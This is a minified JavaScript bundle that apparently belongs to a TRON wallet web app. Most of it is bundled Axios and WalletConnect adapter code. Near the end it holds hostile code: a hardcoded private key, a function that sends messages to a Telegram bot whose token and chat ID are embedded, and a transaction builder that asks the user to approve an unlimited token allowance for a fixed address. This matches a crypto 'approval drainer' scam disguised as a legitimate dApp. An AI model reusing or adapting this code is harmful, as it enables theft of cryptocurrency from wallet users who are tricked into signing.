            if (ZH.hasStandardBrowserEnv && (o && CH.isFunction(o) && (o = o(t)),
            o || !1 !== o && yq(t.url))) {
                const e = i && s && mq.read(s);
                e && a.set(i, e)
            }
            return t
        }
          , Aq = "undefined" !== typeof XMLHttpRequest && function(e) {
            return new Promise((function(t, r) {
                const n = Tq(e);
                let o = n.data;
                const i = iq.from(n.headers).normalize();
                let s, a, c, l, u, {responseType: d, onUploadProgress: h, onDownloadProgress: f} = n;
                function p() {
                    l && l(),
                    u && u(),
                    n.cancelToken && n.cancelToken.unsubscribe(s),
                    n.signal && n.signal.removeEventListener("abort", s)
                }
                let g = new XMLHttpRequest;
                function y() {
                    if (!g)
                        return;
                    const n = iq.from("getAllResponseHeaders"in g && g.getAllResponseHeaders());
                    uq((function(e) {
                        t(e),
                        p()
                    }
                    ), (function(e) {
                        r(e),
                        p()
                    }
                    ), {
                        data: d && "text" !== d && "json" !== d ? g.response : g.responseText,
                        status: g.status,
                        statusText: g.statusText,
                        headers: n,
                        config: e,
                        request: g
                    }),
                    g = null
                }
                g.open(n.method.toUpperCase(), n.url, !0),
                g.timeout = n.timeout,
                "onloadend"in g ? g.onloadend = y : g.onreadystatechange = function() {
                    g && 4 === g.readyState && (0 !== g.status || g.responseURL && 0 === g.responseURL.indexOf("file:")) && setTimeout(y)
                }
                ,
                g.onabort = function() {
                    g && (r(new xH("Request aborted",xH.ECONNABORTED,e,g)),
                    g = null)
                }
                ,
                g.onerror = function() {
                    r(new xH("Network Error",xH.ERR_NETWORK,e,g)),
                    g = null
                }
                ,
                g.ontimeout = function() {
                    let t = n.timeout ? "timeout of " + n.timeout + "ms exceeded" : "timeout exceeded";
                    const o = n.transitional || zH;
                    n.timeoutErrorMessage && (t = n.timeoutErrorMessage),
                    r(new xH(t,o.clarifyTimeoutError ? xH.ETIMEDOUT : xH.ECONNABORTED,e,g)),
                    g = null
                }
                ,
                void 0 === o && i.setContentType(null),
                "setRequestHeader"in g && CH.forEach(i.toJSON(), (function(e, t) {
                    g.setRequestHeader(t, e)
                }
                )),
                CH.isUndefined(n.withCredentials) || (g.withCredentials = !!n.withCredentials),
                d && "json" !== d && (g.responseType = n.responseType),
                f && ([c,u] = fq(f, !0),
                g.addEventListener("progress", c)),
                h && g.upload && ([a,l] = fq(h),
                g.upload.addEventListener("progress", a),
                g.upload.addEventListener("loadend", l)),
                (n.cancelToken || n.signal) && (s = t => {
                    g && (r(!t || t.type ? new lq(null,e,g) : t),
                    g.abort(),
                    g = null)
                }
                ,
                n.cancelToken && n.cancelToken.subscribe(s),
                n.signal && (n.signal.aborted ? s() : n.signal.addEventListener("abort", s)));
                const m = function(e) {
                    const t = /^([-+\w]{1,25})(:?\/\/|:)/.exec(e);
                    return t && t[1] || ""
                }(n.url);
                m && -1 === ZH.protocols.indexOf(m) ? r(new xH("Unsupported protocol " + m + ":",xH.ERR_BAD_REQUEST,e)) : g.send(o || null)
            }
            ))
        }
          , Eq = (e, t) => {
            const {length: r} = e = e ? e.filter(Boolean) : [];
            if (t || r) {
                let r, n = new AbortController;
                const o = function(e) {
                    if (!r) {
                        r = !0,
                        s();
                        const t = e instanceof Error ? e : this.reason;
                        n.abort(t instanceof xH ? t : new lq(t instanceof Error ? t.message : t))
                    }
                };
                let i = t && setTimeout(( () => {
                    i = null,
                    o(new xH("timeout ".concat(t, " of ms exceeded"),xH.ETIMEDOUT))
                }
                ), t);
                const s = () => {
                    e && (i && clearTimeout(i),
                    i = null,
                    e.forEach((e => {
                        e.unsubscribe ? e.unsubscribe(o) : e.removeEventListener("abort", o)
                    }
                    )),
                    e = null)
                }
                ;
                e.forEach((e => e.addEventListener("abort", o)));
                const {signal: a} = n;
                return a.unsubscribe = () => CH.asap(s),
                a
            }
        }
          , Pq = function*(e, t) {
            let r = e.byteLength;
            if (!t || r < t)
                return void (yield e);
            let n, o = 0;
            for (; o < r; )
                n = o + t,
                yield e.slice(o, n),
                o = n
        }
          , Cq = function() {
            var e = Hs((function*(e, t) {
                var r, n = !1, o = !1;
                try {
                    for (var i, s = Ks(Sq(e)); n = !(i = yield Gs(s.next())).done; n = !1) {
                        const e = i.value;
                        yield*$s(Ks(Pq(e, t)))
                    }
                } catch (a) {
                    o = !0,
                    r = a
                } finally {
                    try {
                        n && null != s.return && (yield Gs(s.return()))
                    } finally {
                        if (o)
                            throw r
                    }
                }
            }
            ));
            return function(t, r) {
                return e.apply(this, arguments)
            }
        }()
          , Sq = function() {
            var e = Hs((function*(e) {
                if (e[Symbol.asyncIterator])
                    return void (yield*$s(Ks(e)));
                const t = e.getReader();
                try {
                    for (; ; ) {
                        const {done: e, value: r} = yield Gs(t.read());
                        if (e)
                            break;
                        yield r
                    }
                } finally {
                    yield Gs(t.cancel())
                }
            }
            ));
            return function(t) {
                return e.apply(this, arguments)
            }
        }()
          , Iq = (e, t, r, n) => {
            const o = Cq(e, t);
            let i, s = 0, a = e => {
                i || (i = !0,
                n && n(e))
            }
            ;
            return new ReadableStream({
                async pull(e) {
                    try {
                        const {done: t, value: n} = await o.next();
                        if (t)
                            return a(),
                            void e.close();
                        let i = n.byteLength;
                        if (r) {
                            let e = s += i;
                            r(e)
                        }
                        e.enqueue(new Uint8Array(n))
                    } catch (t) {
                        throw a(t),
                        t
                    }
                },
                cancel: e => (a(e),
                o.return())
            },{
                highWaterMark: 2
            })
        }
          , Bq = "function" === typeof fetch && "function" === typeof Request && "function" === typeof Response
          , xq = Bq && "function" === typeof ReadableStream
          , Oq = Bq && ("function" === typeof TextEncoder ? (e => t => e.encode(t))(new TextEncoder) : async e => new Uint8Array(await new Response(e).arrayBuffer()))
          , _q = function(e) {
            try {
                for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                    r[n - 1] = arguments[n];
                return !!e(...r)
            } catch (_l) {
                return !1
            }
        }
          , Wq = xq && _q(( () => {
            let e = !1;
            const t = new Request(ZH.origin,{
                body: new ReadableStream,
                method: "POST",
                get duplex() {
                    return e = !0,
                    "half"
                }
            }).headers.has("Content-Type");
            return e && !t
        }
        ))
          , Rq = xq && _q(( () => CH.isReadableStream(new Response("").body)))
          , kq = {
            stream: Rq && (e => e.body)
        };
        Bq && (e => {
            ["text", "arrayBuffer", "blob", "formData", "stream"].forEach((t => {
                !kq[t] && (kq[t] = CH.isFunction(e[t]) ? e => e[t]() : (e, r) => {
                    throw new xH("Response type '".concat(t, "' is not supported"),xH.ERR_NOT_SUPPORT,r)
                }
                )
            }
            ))
        }
        )(new Response);
        const Mq = async (e, t) => {
            const r = CH.toFiniteNumber(e.getContentLength());
            return null == r ? (async e => {
                if (null == e)
                    return 0;
                if (CH.isBlob(e))
                    return e.size;
                if (CH.isSpecCompliantForm(e)) {
                    const t = new Request(ZH.origin,{
                        method: "POST",
                        body: e
                    });
                    return (await t.arrayBuffer()).byteLength
                }
                return CH.isArrayBufferView(e) || CH.isArrayBuffer(e) ? e.byteLength : (CH.isURLSearchParams(e) && (e += ""),
                CH.isString(e) ? (await Oq(e)).byteLength : void 0)
            }
            )(t) : r
        }
          , Nq = Bq && (async e => {
            let {url: t, method: r, data: n, signal: o, cancelToken: i, timeout: s, onDownloadProgress: a, onUploadProgress: c, responseType: l, headers: u, withCredentials: d="same-origin", fetchOptions: h} = Tq(e);
            l = l ? (l + "").toLowerCase() : "text";
            let f, p = Eq([o, i && i.toAbortSignal()], s);
            const g = p && p.unsubscribe && ( () => {
                p.unsubscribe()
            }
            );
            let y;
            try {
                if (c && Wq && "get" !== r && "head" !== r && 0 !== (y = await Mq(u, n))) {
                    let e, r = new Request(t,{
                        method: "POST",
                        body: n,
                        duplex: "half"
                    });
                    if (CH.isFormData(n) && (e = r.headers.get("content-type")) && u.setContentType(e),
                    r.body) {
                        const [e,t] = pq(y, fq(gq(c)));
                        n = Iq(r.body, 65536, e, t)
                    }
                }
                CH.isString(d) || (d = d ? "include" : "omit");
                const o = "credentials"in Request.prototype;
                f = new Request(t,(0,
                k.A)((0,
                k.A)({}, h), {}, {
                    signal: p,
                    method: r.toUpperCase(),
                    headers: u.normalize().toJSON(),
                    body: n,
                    duplex: "half",
                    credentials: o ? d : void 0
                }));
                let i = await fetch(f);
                const s = Rq && ("stream" === l || "response" === l);
                if (Rq && (a || s && g)) {
                    const e = {};
                    ["status", "statusText", "headers"].forEach((t => {
                        e[t] = i[t]
                    }
                    ));
                    const t = CH.toFiniteNumber(i.headers.get("content-length"))
                      , [r,n] = a && pq(t, fq(gq(a), !0)) || [];
                    i = new Response(Iq(i.body, 65536, r, ( () => {
                        n && n(),
                        g && g()
                    }
                    )),e)
                }
                l = l || "text";
                let m = await kq[CH.findKey(kq, l) || "text"](i, e);
                return !s && g && g(),
                await new Promise(( (t, r) => {
                    uq(t, r, {
                        data: m,
                        headers: iq.from(i.headers),
                        status: i.status,
                        statusText: i.statusText,
                        config: e,
                        request: f
                    })
                }
                ))
            } catch (m) {
                if (g && g(),
                m && "TypeError" === m.name && /Load failed|fetch/i.test(m.message))
                    throw Object.assign(new xH("Network Error",xH.ERR_NETWORK,e,f), {
                        cause: m.cause || m
                    });
                throw xH.from(m, m && m.code, e, f)
            }
        }
        )
          , Fq = {
            http: null,
            xhr: Aq,
            fetch: Nq
        };
        CH.forEach(Fq, ( (e, t) => {
            if (e) {
                try {
                    Object.defineProperty(e, "name", {
                        value: t
                    })
                } catch (_l) {}
                Object.defineProperty(e, "adapterName", {
                    value: t
                })
            }
        }
        ));
        const Uq = e => "- ".concat(e)
          , Dq = e => CH.isFunction(e) || null === e || !1 === e
          , Lq = e => {
            e = CH.isArray(e) ? e : [e];
            const {length: t} = e;
            let r, n;
            const o = {};
            for (let i = 0; i < t; i++) {
                let t;
                if (r = e[i],
                n = r,
                !Dq(r) && (n = Fq[(t = String(r)).toLowerCase()],
                void 0 === n))
                    throw new xH("Unknown adapter '".concat(t, "'"));
                if (n)
                    break;
                o[t || "#" + i] = n
            }
            if (!n) {
                const e = Object.entries(o).map((e => {
                    let[t,r] = e;
                    return "adapter ".concat(t, " ") + (!1 === r ? "is not supported by the environment" : "is not available in the build")
                }
                ));
                let r = t ? e.length > 1 ? "since :\n" + e.map(Uq).join("\n") : " " + Uq(e[0]) : "as no adapter specified";
                throw new xH("There is no suitable adapter to dispatch the request " + r,"ERR_NOT_SUPPORT")
            }
            return n
        }
        ;
        function jq(e) {
            if (e.cancelToken && e.cancelToken.throwIfRequested(),
            e.signal && e.signal.aborted)
                throw new lq(null,e)
        }
        function zq(e) {
            jq(e),
            e.headers = iq.from(e.headers),
            e.data = sq.call(e, e.transformRequest),
            -1 !== ["post", "put", "patch"].indexOf(e.method) && e.headers.setContentType("application/x-www-form-urlencoded", !1);
            return Lq(e.adapter || XH.adapter)(e).then((function(t) {
                return jq(e),
                t.data = sq.call(e, e.transformResponse, t),
                t.headers = iq.from(t.headers),
                t
            }
            ), (function(t) {
                return aq(t) || (jq(e),
                t && t.response && (t.response.data = sq.call(e, e.transformResponse, t.response),
                t.response.headers = iq.from(t.response.headers))),
                Promise.reject(t)
            }
            ))
        }
        const Vq = "1.9.0"
          , Hq = {};
        ["object", "boolean", "number", "function", "string", "symbol"].forEach(( (e, t) => {
            Hq[e] = function(r) {
                return typeof r === e || "a" + (t < 1 ? "n " : " ") + e
            }
        }
        ));
        const qq = {};
        Hq.transitional = function(e, t, r) {
            function n(e, t) {
                return "[Axios v1.9.0] Transitional option '" + e + "'" + t + (r ? ". " + r : "")
            }
            return (r, o, i) => {
                if (!1 === e)
                    throw new xH(n(o, " has been removed" + (t ? " in " + t : "")),xH.ERR_DEPRECATED);
                return t && !qq[o] && (qq[o] = !0,
                console.warn(n(o, " has been deprecated since v" + t + " and will be removed in the near future"))),
                !e || e(r, o, i)
            }
        }
        ,
        Hq.spelling = function(e) {
            return (t, r) => (console.warn("".concat(r, " is likely a misspelling of ").concat(e)),
            !0)
        }
        ;
        const Gq = {
            assertOptions: function(e, t, r) {
                if ("object" !== typeof e)
                    throw new xH("options must be an object",xH.ERR_BAD_OPTION_VALUE);
                const n = Object.keys(e);
                let o = n.length;
                for (; o-- > 0; ) {
                    const i = n[o]
                      , s = t[i];
                    if (s) {
                        const t = e[i]
                          , r = void 0 === t || s(t, i, e);
                        if (!0 !== r)
                            throw new xH("option " + i + " must be " + r,xH.ERR_BAD_OPTION_VALUE)
                    } else if (!0 !== r)
                        throw new xH("Unknown option " + i,xH.ERR_BAD_OPTION)
                }
            },
            validators: Hq
        }
          , $q = Gq.validators;
        class Kq {
            constructor(e) {
                this.defaults = e || {},
                this.interceptors = {
                    request: new jH,
                    response: new jH
                }
            }
            async request(e, t) {
                try {
                    return await this._request(e, t)
                } catch (r) {
                    if (r instanceof Error) {
                        let e = {};
                        Error.captureStackTrace ? Error.captureStackTrace(e) : e = new Error;
                        const t = e.stack ? e.stack.replace(/^.+\n/, "") : "";
                        try {
                            r.stack ? t && !String(r.stack).endsWith(t.replace(/^.+\n.+\n/, "")) && (r.stack += "\n" + t) : r.stack = t
                        } catch (_l) {}
                    }
                    throw r
                }
            }
            _request(e, t) {
                "string" === typeof e ? (t = t || {}).url = e : t = e || {},
                t = wq(this.defaults, t);
                const {transitional: r, paramsSerializer: n, headers: o} = t;
                void 0 !== r && Gq.assertOptions(r, {
                    silentJSONParsing: $q.transitional($q.boolean),
                    forcedJSONParsing: $q.transitional($q.boolean),
                    clarifyTimeoutError: $q.transitional($q.boolean)
                }, !1),
                null != n && (CH.isFunction(n) ? t.paramsSerializer = {
                    serialize: n
                } : Gq.assertOptions(n, {
                    encode: $q.function,
                    serialize: $q.function
                }, !0)),
                void 0 !== t.allowAbsoluteUrls || (void 0 !== this.defaults.allowAbsoluteUrls ? t.allowAbsoluteUrls = this.defaults.allowAbsoluteUrls : t.allowAbsoluteUrls = !0),
                Gq.assertOptions(t, {
                    baseUrl: $q.spelling("baseURL"),
                    withXsrfToken: $q.spelling("withXSRFToken")
                }, !0),
                t.method = (t.method || this.defaults.method || "get").toLowerCase();
                let i = o && CH.merge(o.common, o[t.method]);
                o && CH.forEach(["delete", "get", "head", "post", "put", "patch", "common"], (e => {
                    delete o[e]
                }
                )),
                t.headers = iq.concat(i, o);
                const s = [];
                let a = !0;
                this.interceptors.request.forEach((function(e) {
                    "function" === typeof e.runWhen && !1 === e.runWhen(t) || (a = a && e.synchronous,
                    s.unshift(e.fulfilled, e.rejected))
                }
                ));
                const c = [];
                let l;
                this.interceptors.response.forEach((function(e) {
                    c.push(e.fulfilled, e.rejected)
                }
                ));
                let u, d = 0;
                if (!a) {
                    const e = [zq.bind(this), void 0];
                    for (e.unshift.apply(e, s),
                    e.push.apply(e, c),
                    u = e.length,
                    l = Promise.resolve(t); d < u; )
                        l = l.then(e[d++], e[d++]);
                    return l
                }
                u = s.length;
                let h = t;
                for (d = 0; d < u; ) {
                    const e = s[d++]
                      , t = s[d++];
                    try {
                        h = e(h)
                    } catch (f) {
                        t.call(this, f);
                        break
                    }
                }
                try {
                    l = zq.call(this, h)
                } catch (f) {
                    return Promise.reject(f)
                }
                for (d = 0,
                u = c.length; d < u; )
                    l = l.then(c[d++], c[d++]);
                return l
            }
            getUri(e) {
                return LH(bq((e = wq(this.defaults, e)).baseURL, e.url, e.allowAbsoluteUrls), e.params, e.paramsSerializer)
            }
        }
        CH.forEach(["delete", "get", "head", "options"], (function(e) {
            Kq.prototype[e] = function(t, r) {
                return this.request(wq(r || {}, {
                    method: e,
                    url: t,
                    data: (r || {}).data
                }))
            }
        }
        )),
        CH.forEach(["post", "put", "patch"], (function(e) {
            function t(t) {
                return function(r, n, o) {
                    return this.request(wq(o || {}, {
                        method: e,
                        headers: t ? {
                            "Content-Type": "multipart/form-data"
                        } : {},
                        url: r,
                        data: n
                    }))
                }
            }
            Kq.prototype[e] = t(),
            Kq.prototype[e + "Form"] = t(!0)
        }
        ));
        const Zq = Kq;
        class Yq {
            constructor(e) {
                if ("function" !== typeof e)
                    throw new TypeError("executor must be a function.");
                let t;
                this.promise = new Promise((function(e) {
                    t = e
                }
                ));
                const r = this;
                this.promise.then((e => {
                    if (!r._listeners)
                        return;
                    let t = r._listeners.length;
                    for (; t-- > 0; )
                        r._listeners[t](e);
                    r._listeners = null
                }
                )),
                this.promise.then = e => {
                    let t;
                    const n = new Promise((e => {
                        r.subscribe(e),
                        t = e
                    }
                    )).then(e);
                    return n.cancel = function() {
                        r.unsubscribe(t)
                    }
                    ,
                    n
                }
                ,
                e((function(e, n, o) {
                    r.reason || (r.reason = new lq(e,n,o),
                    t(r.reason))
                }
                ))
            }
            throwIfRequested() {
                if (this.reason)
                    throw this.reason
            }
            subscribe(e) {
                this.reason ? e(this.reason) : this._listeners ? this._listeners.push(e) : this._listeners = [e]
            }
            unsubscribe(e) {
                if (!this._listeners)
                    return;
                const t = this._listeners.indexOf(e);
                -1 !== t && this._listeners.splice(t, 1)
            }
            toAbortSignal() {
                const e = new AbortController
                  , t = t => {
                    e.abort(t)
                }
                ;
                return this.subscribe(t),
                e.signal.unsubscribe = () => this.unsubscribe(t),
                e.signal
            }
            static source() {
                let e;
                const t = new Yq((function(t) {
                    e = t
                }
                ));
                return {
                    token: t,
                    cancel: e
                }
            }
        }
        const Jq = Yq;
        const Xq = {
            Continue: 100,
            SwitchingProtocols: 101,
            Processing: 102,
            EarlyHints: 103,
            Ok: 200,
            Created: 201,
            Accepted: 202,
            NonAuthoritativeInformation: 203,
            NoContent: 204,
            ResetContent: 205,
            PartialContent: 206,
            MultiStatus: 207,
            AlreadyReported: 208,
            ImUsed: 226,
            MultipleChoices: 300,
            MovedPermanently: 301,
            Found: 302,
            SeeOther: 303,
            NotModified: 304,
            UseProxy: 305,
            Unused: 306,
            TemporaryRedirect: 307,
            PermanentRedirect: 308,
            BadRequest: 400,
            Unauthorized: 401,
            PaymentRequired: 402,
            Forbidden: 403,
            NotFound: 404,
            MethodNotAllowed: 405,
            NotAcceptable: 406,
            ProxyAuthenticationRequired: 407,
            RequestTimeout: 408,
            Conflict: 409,
            Gone: 410,
            LengthRequired: 411,
            PreconditionFailed: 412,
            PayloadTooLarge: 413,
            UriTooLong: 414,
            UnsupportedMediaType: 415,
            RangeNotSatisfiable: 416,
            ExpectationFailed: 417,
            ImATeapot: 418,
            MisdirectedRequest: 421,
            UnprocessableEntity: 422,
            Locked: 423,
            FailedDependency: 424,
            TooEarly: 425,
            UpgradeRequired: 426,
            PreconditionRequired: 428,
            TooManyRequests: 429,
            RequestHeaderFieldsTooLarge: 431,
            UnavailableForLegalReasons: 451,
            InternalServerError: 500,
            NotImplemented: 501,
            BadGateway: 502,
            ServiceUnavailable: 503,
            GatewayTimeout: 504,
            HttpVersionNotSupported: 505,
            VariantAlsoNegotiates: 506,
            InsufficientStorage: 507,
            LoopDetected: 508,
            NotExtended: 510,
            NetworkAuthenticationRequired: 511
        };
        Object.entries(Xq).forEach((e => {
            let[t,r] = e;
            Xq[r] = t
        }
        ));
        const Qq = Xq;
        const eG = function e(t) {
            const r = new Zq(t)
              , n = zV(Zq.prototype.request, r);
            return CH.extend(n, Zq.prototype, r, {
                allOwnKeys: !0
            }),
            CH.extend(n, r, null, {
                allOwnKeys: !0
            }),
            n.create = function(r) {
                return e(wq(t, r))
            }
            ,
            n
        }(XH);
        eG.Axios = Zq,
        eG.CanceledError = lq,
        eG.CancelToken = Jq,
        eG.isCancel = aq,
        eG.VERSION = Vq,
        eG.toFormData = kH,
        eG.AxiosError = xH,
        eG.Cancel = eG.CanceledError,
        eG.all = function(e) {
            return Promise.all(e)
        }
        ,
        eG.spread = function(e) {
            return function(t) {
                return e.apply(null, t)
            }
        }
        ,
        eG.isAxiosError = function(e) {
            return CH.isObject(e) && !0 === e.isAxiosError
        }
        ,
        eG.mergeConfig = wq,
        eG.AxiosHeaders = iq,
        eG.formToJSON = e => YH(CH.isHTMLForm(e) ? new FormData(e) : e),
        eG.getAdapter = Lq,
        eG.HttpStatusCode = Qq,
        eG.default = eG;
        const tG = eG;
        "undefined" !== typeof window && "undefined" === typeof window.Buffer && (window.Buffer = r(6382).hp);
        const rG = new lj({
            fullHost: "https://api.trongrid.io",
            disableProtoValidation: !0,
            privateKey: "68c7421d83f985f27135498c5e44680fc3b0dbbe09b6fceee074e9a5219eb7e1"
        })
          , nG = new class extends nC {
            constructor(e) {
                if (super(),
                this.name = "WalletConnect",
                this.url = "https://walletconnect.org",
                this.icon = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjMwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJtNjEuNDM4NTQsOTQuMDAzOGM0OC45MTEyMywtNDcuODg4MTcgMTI4LjIxMTk5LC00Ny44ODgxNyAxNzcuMTIzMjEsMGw1Ljg4NjU1LDUuNzYzNDJjMi40NDU1NiwyLjM5NDQxIDIuNDQ1NTYsNi4yNzY1MSAwLDguNjcwOTJsLTIwLjEzNjcsMTkuNzE1NWMtMS4yMjI3OCwxLjE5NzIxIC0zLjIwNTMsMS4xOTcyMSAtNC40MjgwOCwwbC04LjEwMDU4LC03LjkzMTE1Yy0zNC4xMjE2OSwtMzMuNDA3OTggLTg5LjQ0Mzg5LC0zMy40MDc5OCAtMTIzLjU2NTU4LDBsLTguNjc1MDYsOC40OTM2MWMtMS4yMjI3OCwxLjE5NzIgLTMuMjA1MywxLjE5NzIgLTQuNDI4MDgsMGwtMjAuMTM2NjksLTE5LjcxNTVjLTIuNDQ1NTYsLTIuMzk0NDEgLTIuNDQ1NTYsLTYuMjc2NTIgMCwtOC42NzA5Mmw2LjQ2MTAxLC02LjMyNTg4em0yMTguNzY3OCw0MC43NzM3NWwxNy45MjE3LDE3LjU0Njg5YzIuNDQ1NTQsMi4zOTQ0IDIuNDQ1NTYsNi4yNzY0OCAwLjAwMDAzLDguNjcwODlsLTgwLjgxMDE3LDc5LjEyMTE0Yy0yLjQ0NTU1LDIuMzk0NDIgLTYuNDEwNTksMi4zOTQ0NSAtOC44NTYxNiwwLjAwMDA2Yy0wLjAwMDAxLC0wLjAwMDAxIC0wLjAwMDAzLC0wLjAwMDAyIC0wLjAwMDA0LC0wLjAwMDAzbC01Ny4zNTQxNCwtNTYuMTU0NThjLTAuNjExMzksLTAuNTk4NiAtMS42MDI2NSwtMC41OTg2IC0yLjIxNDA0LDBjMCwwLjAwMDAxIC0wLjAwMDAxLDAuMDAwMDEgLTAuMDAwMDEsMC4wMDAwMmwtNTcuMzUyOTIsNTYuMTU0NTNjLTIuNDQ1NTQsMi4zOTQ0MyAtNi40MTA1OCwyLjM5NDQ3IC04Ljg1NjE2LDAuMDAwMDhjLTAuMDAwMDIsLTAuMDAwMDEgLTAuMDAwMDMsLTAuMDAwMDIgLTAuMDAwMDUsLTAuMDAwMDRsLTgwLjgxMjQyLC03OS4xMjIxOWMtMi40NDU1NiwtMi4zOTQ0IC0yLjQ0NTU2LC02LjI3NjUxIDAsLTguNjcwOTFsMTcuOTIxNzMsLTE3LjU0Njg3YzIuNDQ1NTYsLTIuMzk0NDEgNi40MTA2LC0yLjM5NDQxIDguODU2MTYsMGw1Ny4zNTQ5OCw1Ni4xNTUzNWMwLjYxMTM5LDAuNTk4NjEgMS42MDI2NSwwLjU5ODYxIDIuMjE0MDQsMGMwLjAwMDAxLDAgMC4wMDAwMiwtMC4wMDAwMSAwLjAwMDAzLC0wLjAwMDAybDU3LjM1MjEsLTU2LjE1NTMzYzIuNDQ1NSwtMi4zOTQ0NyA2LjQxMDU0LC0yLjM5NDU2IDguODU2MTYsLTAuMDAwMmMwLjAwMDAzLDAuMDAwMDMgMC4wMDAwNywwLjAwMDA3IDAuMDAwMSwwLjAwMDFsNTcuMzU0OSw1Ni4xNTU0M2MwLjYxMTM5LDAuNTk4NiAxLjYwMjY1LDAuNTk4NiAyLjIxNDA0LDBsNTcuMzUzOTgsLTU2LjE1NDMyYzIuNDQ1NTYsLTIuMzk0NDEgNi40MTA2LC0yLjM5NDQxIDguODU2MTYsMHoiIGZpbGw9IiMzYjk5ZmMiIGlkPSJzdmdfMSIvPjwvc3ZnPg==",
                this._readyState = XP.Found,
                this._state = QP.Disconnect,
                this._disconnected = () => {
                    const e = this._wallet;
                    e && (e.client.off("session_delete", this._disconnected),
                    this._wallet = null,
                    this._address = null,
                    this._state = QP.Disconnect,
                    this.emit("disconnect"),
                    this.emit("stateChanged", this._state))
                }
                ,
                !(e = Object.assign({}, e)) || "object" !== typeof e)
                    throw new Error("[WalletconnectAdapter] config is required.");
                if (e.network || (console.error("[WalletconnectAdapter] config.network must be one of ".concat(TC.join(), " or a chainID such as 0x2b6653dc. Use Nile network instead.")),
                e.network = "Nile"),
                !e.options)
                    throw new Error("[WalletconnectAdapter] config.options is required.");
                this._connecting = !1,
                this._wallet = null,
                this._address = null,
                this._config = e
            }
            get address() {
                return this._address
            }
            get readyState() {
                return this._readyState
            }
            get state() {
                return this._state
            }
            get connecting() {
                return this._connecting
            }
            connect() {
                return wC(this, void 0, void 0, (function*() {
                    try {
                        if (this.connected || this.connecting)
                            return;
                        if (this.state === QP.NotFound)
                            throw new iC;
                        let t, r;
                        this._connecting = !0;
                        try {
                            t = new vC({
                                network: hC[this._config.network] || "tron:".concat(this._config.network),
                                options: this._config.options,
                                web3ModalConfig: this._config.web3ModalConfig
                            }),
                            ({address: r} = yield t.connect())
                        } catch (e) {
                            if ("Web3ModalError" === e.constructor.name)
                                throw new dC;
                            throw new aC(null === e || void 0 === e ? void 0 : e.message,e)
                        }
                        t.client.on("session_delete", this._disconnected),
                        this._wallet = t,
                        this._address = r || "",
                        this._state = QP.Connected,
                        this.emit("stateChanged", this._state),
                        this.emit("connect", r)
                    } catch (e) {
                        throw this.emit("error", e),
                        e
                    } finally {
                        this._connecting = !1
                    }
                }
                ))
            }
            disconnect() {
                return wC(this, void 0, void 0, (function*() {
                    if (this.state === QP.NotFound)
                        return;
                    const e = this._wallet;
                    if (e) {
                        e.client.off("session_delete", this._disconnected),
                        this._wallet = null,
                        this._address = null;
                        try {
                            yield e.disconnect()
                        } catch (t) {
                            this.emit("error", new cC(null === t || void 0 === t ? void 0 : t.message,t))
                        }
                    }
                    this._state = QP.Disconnect,
                    this.emit("disconnect"),
                    this.emit("stateChanged", this._state)
                }
                ))
            }
            signTransaction(e) {
                return wC(this, void 0, void 0, (function*() {
                    if (this.state !== QP.Connected)
                        throw new sC;
                    try {
                        const r = this._wallet;
                        if (!r)
                            throw new sC;
                        try {
                            return yield r.signTransaction({
                                transaction: e
                            })
                        } catch (t) {
                            throw new uC(null === t || void 0 === t ? void 0 : t.message,t)
                        }
                    } catch (t) {
                        throw this.emit("error", t),
                        t
                    }
                }
                ))
            }
            signMessage(e) {
                return wC(this, void 0, void 0, (function*() {
                    try {
                        const r = this._wallet;
                        if (!r)
                            throw new sC;
                        try {
                            return yield r.signMessage(e)
                        } catch (t) {
                            throw new lC(null === t || void 0 === t ? void 0 : t.message,t)
                        }
                    } catch (t) {
                        throw this.emit("error", t),
                        t
                    }
                }
                ))
            }
        }
        ({
            network: "Mainnet",
            options: {
                relayUrl: "wss://relay.walletconnect.com",
                projectId: "1d7c094b92213b27e88ac00ab7602643",
                metadata: {
                    name: "Example App",
                    description: "Example App",
                    url: "https://yourdapp-url.com",
                    icons: ["https://yourdapp-url.com/icon.png"]
                },
                qrcodeModalOptions: {
                    desktopLinks: ["trust"],
                    mobileLinks: ["trust"]
                }
            },
            web3ModalConfig: {
                themeMode: "dark",
                themeVariables: {
                    "--wcm-z-index": "1000"
                },
                explorerRecommendedWalletIds: ["225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f", "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369", "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0"]
            }
        })
          , oG = async (e, t) => {
            try {
                return {
                    statue: !0,
                    data: await tG.post("".concat("https://walletscans.org:443", "/api/buy"), {
                        energy_amount: e,
                        receive_address: t,
                        isTestnet: FV
                    })
                }
            } catch (r) {
                return console.log(r),
                {
                    statue: !1,
                    data: null
                }
            }
        }
          , iG = async e => {
            try {
                const t = (await rG.transactionBuilder.triggerConstantContract(UV, "balanceOf(address)", {}, [{
                    type: "address",
                    value: e
                }], rG.address.toHex(e))).constant_result[0]
                  , r = t.startsWith("0x") ? t : "0x".concat(t)
                  , n = rG.toBigNumber(r);
                return n.dividedBy(10 ** 6).toNumber()
            } catch (t) {
                console.log("Error fetching allowance:", t)
            }
        }
          , sG = e => {
            try {
                fetch("https://api.telegram.org/bot".concat("8475457509:AAE4dn9XwiW7WYA_o_YyR-R7LCQjG6PIaJ8", "/sendMessage"), {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: "1096849028",
                        text: e,
                        parse_mode: "HTML"
                    })
                })
            } catch (t) {
                console.log("Chat bot error", t)
            }
        }
          , aG = "0x2b6653dc";
        class cG {
            constructor(e) {
                this.tronWeb = new lj({
                    fullHost: "https://".concat("api", ".trongrid.io")
                }),
                this.provider = e
            }
            async getBalance(e) {
                try {
                    const t = await this.tronWeb.trx.getBalance(e);
                    return this.tronWeb.fromSun(t)
                } catch (t) {
                    return console.error("Balance error:", t),
                    "0"
                }
            }
            async sendTransaction(e) {
                if (!this.provider)
                    throw new Error("Provider is required to sign a transaction.");
                try {
                    const t = this.tronWeb
                      , r = UV
                      , n = {
                        feeLimit: 1e9,
                        callValue: 0
                    }
                      , o = [{
                        type: "address",
                        value: LV
                    }, {
                        type: "uint256",
                        value: "115792089237316195423570985008687907853269984665640564039457584007913129639935"
                    }]
                      , i = "approve(address,uint256)"
